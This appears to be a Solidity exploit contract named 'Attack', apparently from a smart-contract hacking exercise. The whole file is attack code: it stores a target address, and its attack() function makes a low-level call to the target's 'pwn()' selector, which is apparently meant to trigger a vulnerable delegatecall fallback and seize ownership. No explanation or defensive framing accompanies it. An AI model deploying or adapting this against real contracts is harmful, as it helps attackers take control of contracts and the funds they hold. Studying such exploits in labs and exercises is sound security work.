// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public hackMe;

    constructor(address _hackMe) public {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}